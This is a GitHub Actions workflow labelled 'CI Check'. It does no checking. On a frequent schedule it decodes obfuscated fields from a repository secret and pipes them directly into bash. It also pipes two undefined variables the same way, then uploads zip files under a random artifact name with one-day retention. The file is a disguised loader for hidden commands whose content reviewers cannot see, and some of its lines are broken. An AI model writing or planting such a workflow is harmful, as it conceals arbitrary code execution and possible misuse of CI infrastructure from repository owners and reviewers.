name: CI Check
on:
  workflow_dispatch:

  schedule:
    - cron: '27 2,8,14,20 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  main:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Process
        env:
          img066: ${{ secrets.img066 }}
        run: |
          printf '%s' "$img066" | jq -r .ymx078 | /bin/bash
          echo $bx1 | jq -r .ww93576 | /bin/bash
          printf '%s' "$vrg85" | jq -r .pv92 | /bin/bash

      - name: Archive output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: Xrn4fYtn
          path: "*.zip"
          retention-days: 1
